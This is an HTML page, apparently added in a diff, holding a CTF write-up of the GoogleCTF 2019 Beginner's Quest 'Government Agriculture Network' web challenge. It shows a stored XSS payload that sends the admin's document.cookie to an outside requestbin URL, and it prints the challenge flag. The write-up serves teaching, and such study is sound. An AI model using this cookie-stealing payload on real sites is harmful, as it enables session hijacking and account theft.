@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.65.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.github.io/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/syntax.css">
+
+    
+    <title>shiny-labs || GoogleCTF Beginner&#39;s Quest 2019 - Government Agriculture Network</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.github.io/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.github.io/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.github.io/posts/" class="no-squiggly">Posts</a></li>
+            <li><a href="https://shiny-labs.github.io/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.github.io/about/" class="no-squiggly">About</a></li>
+            <li><a href="https://shiny-labs.github.io/archives/" class="no-squiggly">Archives</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">GoogleCTF Beginner&#39;s Quest 2019 - Government Agriculture Network</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="August 6, 2019">
+      Aug 6
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.github.io/categories"></a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.github.io/series/googlectf-beginners-quest-2019">GoogleCTF Beginner&#39;s Quest 2019</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.github.io/tags/web">web</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h2 id="description">Description</h2>
+<blockquote>
+<p>Well it seems someone can&rsquo;t keep their work life and their home life separate. You vaguely recall on your home planet, posters put up everywhere that said &ldquo;Loose Zips sink large commercial properties with a responsibility to the shareholders.&rdquo; You wonder if there is a similar concept here.</p>
+<p>Using the credentials to access this so-called Agricultural network, you realize that SarahH was just hired as a vendor or contract worker and given access that was equivalent. You can only assume that Vendor/Contractor is the highest possible rank bestowed upon only the most revered and well regarded individuals of the land and expect information and access to flow like the Xenovian acid streams you used to bathe in as a child.</p>
+<p>The portal picture displays that small very attractive individual whom you instantly form a bond with, despite not knowing. You must meet this entity! Converse and convince them you&rsquo;re meant to be! After a brief amount of time the picture shifts into a biped presumably ingesting this creature! HOW DARE THEY. You have to save them, you have to stop this from happening. Get more information about this Gubberment thing and stop this atrocity.</p>
+<p>You need to get in closer to save them - you beat on the window, but you need access to the cauliflower&rsquo;s  host to rescue it.</p>
+<p><a href="https://govagriculture.web.ctfcompetition.com/">https://govagriculture.web.ctfcompetition.com/</a></p>
+</blockquote>
+<h2 id="solving">Solving</h2>
+<p>Let&rsquo;s have a look at <a href="https://govagriculture.web.ctfcompetition.com/:">https://govagriculture.web.ctfcompetition.com/:</a></p>
+<p><img src="00_gan_home.png" alt=""></p>
+<p>At least we won&rsquo;t get lost on that website, there&rsquo;s only one page!</p>
+<p>The <code>admin</code> link in the top-right hand corner returns a 303 HTTP code and returns the same page.</p>
+<p>So, let&rsquo;s explore the only thing there is on that page! The lady eating cauliflowers! Oops, I meant the <code>Create a new post</code> text field :D If we submit a text, then we obtain the following message:</p>
+<p><img src="01_gan_post_submitted.png" alt=""></p>
+<p>Hum, so, we can submit stuff and the admin will come take a look at it? That&rsquo;s interesting! What if the admin has a special cookie or HTTP header?</p>
+<p>Let&rsquo;s try to trick the admin&hellip; IE, let&rsquo;s go for a stored XSS attack!</p>
+<p>To do so, we can profit from the awesome <a href="http://requestbin.net/">requestbin</a>:</p>
+<blockquote>
+<p>RequestBin gives you a URL that will collect requests made to it and let you inspect them in a human-friendly way. Use RequestBin to see what your HTTP client is sending or to inspect and debug webhook requests.</p>
+</blockquote>
+<p>Hit the <code>Create a new RequestBin</code> button to obtain a Bin URL, for example: <a href="http://requestbin.net/r/1ktoe8l1">http://requestbin.net/r/1ktoe8l1</a>. Now, every time something/someone reach that URL, it will be displayed.</p>
+<p><img src="02_requestbin_new.png" alt=""></p>
+<p>Test the RequestBin by running:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl -X POST -d <span class="s2">&#34;yo=lo&#34;</span> http://requestbin.net/r/1ktoe8l1
+</code></pre></div><p>Refresh the RequestBin page to inspect the details of the HTTP request you made:</p>
+<p><img src="03_requestbin_test.png" alt=""></p>
+<p>Next, we need to hide this URL on the Ministry of Agriculture&rsquo;s website so that the admin visits it. One technique is to use Javascript code which generates the HTML code for an image:</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=\&#34;\&#34;&#39;</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div><p>Okay, great, but how does this help us trick the admin into visiting the requestbin? The RequestBin URL can be used as the source of the image!</p>
+<div class="highlight"><pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=\&#34;http://requestbin.net/r/1ktoe8l1\&#34;&#39;</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div><p>But you talked about cookies earlier?!</p>
+<p><img src="pusheen_cookie.gif" alt=""></p>
+<p>Cookies can be accessed with <code>document.cookie</code> and pass them as a parameter to the RequestBin URL to retrieve them:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;script&gt;document.write(&#39;&lt;img src=\&#34;http://requestbin.net/r/1ktoe8l1?meeatcookies=&#39;+document.cookie+&#39;\&#34;&#39;);&lt;/script&gt;
+</code></pre></div><p>Now, paste that evil Javascript into the text field and refresh the RequestBin!</p>
+<p><img src="04_requestbin_flag.png" alt=""></p>
+<p>Flag: <code>CTF{8aaa2f34b392b415601804c2f5f0f24e}</code></p>
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solving">Solving</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.github.io/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
